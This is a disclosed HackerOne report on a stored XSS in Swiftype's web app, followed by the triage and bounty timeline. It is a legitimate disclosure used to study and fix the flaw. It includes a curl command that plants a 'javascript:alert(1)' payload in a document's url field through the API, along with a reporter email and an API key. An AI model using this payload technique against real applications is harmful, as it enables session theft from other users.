---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/cross-site-scripting-xss-stored
  - env/web
substate: "resolved"
weakness: "Cross-site Scripting (XSS) - Stored"
enriched: true
body: true
date: 2021-08-03
submitted: 2021-06-27T17:12:11.813Z
bounty_usd: null
votes: 7
cve: []
program: "[[programs/elastic|Elastic]]"
reporter: "superman85"
source: "https://hackerone.com/reports/1245787"
title: "[Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`"
---
# [Swiftype] - Stored XSS via document field `url` triggers on `https://app.swiftype.com/engines/<engine>/document_types/<type>/documents/<id>`

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 7 | **Program:** Elastic | **Disclosed:** 2021-08-03

- Report: [https://hackerone.com/reports/1245787](https://hackerone.com/reports/1245787)
- CWE: Cross-site Scripting (XSS) - Stored
- Submitted: 2021-06-27T17:12:11.813Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Dear Team,

I have found a stored XSS when create a document via API-based engine. The XSS payload stored in `url` field. 
To understand about document schema for API-based engine, please go to https://swiftype.com/documentation/site-search/guides/schema-design#api-based

After indexed a document with XSS payload stored in `url` field. When view the document details, click on link `View on your site` the XSS will triggered.

Step to reproduce
===

1 - Create a trial account on https://app.swiftype.com/ my admin account email is `qwerty.chan8@gmail.com`
2 - Create a API-based Engine by visit https://app.swiftype.com/engines/api , choose a Engine name and DocumentType Name and click Create Engine.For example in my case (Engine: **123**, DocumentType: **test**)

{F1355460}

3 - Go to https://app.swiftype.com/settings/account and obtain your API Key for example in my case: **gB7BT3iA3GhqoU_SWoRq**

{F1355464}

4 - Call API to create a document follow curl command below, store XSS payload `javascript:alert(1)` in `url` and `thumbnail_url` field value

```
curl -X POST 'https://api.swiftype.com/api/v1/engines/123/document_types/test/documents.json' \
  -H 'Content-Type: application/json' \
  -d '{
        "auth_token": "gB7BT3iA3GhqoU_SWoRq",
        "document": {
          "external_id": "v1uyQZNg2vE",
          "fields": [
            {"name": "url", "value": "javascript:alert(1)", "type":  "enum"},
            {"name": "thumbnail_url", "value": "javascript:alert(1)", "type": "enum"},
            {"name": "channel_id", "value": "UCK8sQmJBp8GCxrOtXWBpyEA", "type": "enum"},
            {"name": "title", "value": "How It Feels [through Glass]", "type": "string"},
            {"name": "caption", "value": "Want to see how Glass actually feels?...", "type": "text"},
            {"name": "tags", "value": ["glass", "wearable computing", "google"], "type": "string"},
            {"name": "category_name", "value": "Science & Technology", "type": "string"},
            {"name": "category_id", "value": 28, "type": "enum"},
            {"name": "published_at", "value": "2013-02-20T10:47:18", "type": "date"},
            {"name": "duration", "value": 136, "type": "integer"},
            {"name": "view_count", "value": 14599202, "type": "integer"},
            {"name": "like_count", "value": 75952, "type": "integer"}
          ]
        }
     }'
```
5 - Go to Engine **123** and click on Manage -> Content or https://app.swiftype.com/engines/123/document_types/test/documents#q=&page=1

{F1355463}

6 - Click on document ID **v1uyQZNg2vE** you just created, you can see the document details

{F1355462}

7 - Click on the link `http://javascript:alert(1)` in document details

{F1355461}

{F1355465}

## Impact

Steal other users sessions, trick users go to unwanted websites

## Timeline

- **Report Filed**
- **2021-06-27** @superman85: To clarify impact of this report: An user with **Editor** role can create a document and store XSS payload in `url` field. When an **Admin** or **Viewer** user visit the `url` their sessions might be stolen
- **2021-06-29** @h1_analyst_amey: Hi @superman85,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@forest_dweller
- **Report Severity Updated**
- **Report Title Updated**
- **Report Triaged**
- **Report Severity Updated**
- **Bounty Awarded**
- **2021-06-30** @superman85: @douglas_day Thank you so much for the bounty!
- **2021-07-01** @douglas_day: Of course @superman85 !

Would you mind making another video for us, explaining your bug? :) You can leave out your introduction because you provided that in your last video
- **2021-07-01** @superman85: @douglas_day I can make a video today when I came back home.
- **2021-07-02** @superman85: @douglas_day I have created second video explain my bugs. Please take a look! Sorry for my English and the sound device in my laptop is bad!

██████████

If you do not mind! Can you invite my friends to join Elastic bbp?

https://hackerone.com/duahaubadao?type=user
https://hackerone.com/haxor31337?type=user

Thank you
- **Bounty Awarded**
- **2021-07-06** @douglas_day: I just invited them :) 

Hope the three of you are able to find some awesome bugs!
- **2021-07-06** @superman85: @douglas_day thank you so much for the bonus and the invitation!
- **2021-07-06** @superman85: @douglas_day I am using free trial 14 days on app.swiftype.com? Can you give me an access to Pro/Premium plan for testing other features?

Thanks,
- **2021-07-08** @douglas_day: Hey @superman85 ,

I looked into this and what i can do is make your free trial unlimited, and if you want any specific Pro/Premium features, just tell me which features and I can look into enabling them for you.
- **2021-07-09** @superman85: @douglas_day I read a link at https://swiftype.com/documentation/site-search/guides/multiple-domains and see a function is not exist in my trial account **Interface Designer**

{F1370845}

Can you check and let me know! Thanks

`I looked into this and what i can do is make your free trial unlimited`

Can you make my account email: qwerty.chan8@gmail.com to unlimited? Thanks
- **Report Resolved**
- **2021-08-03** @superman85: Since the report was resolved. Lets disclose it. Thanks
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
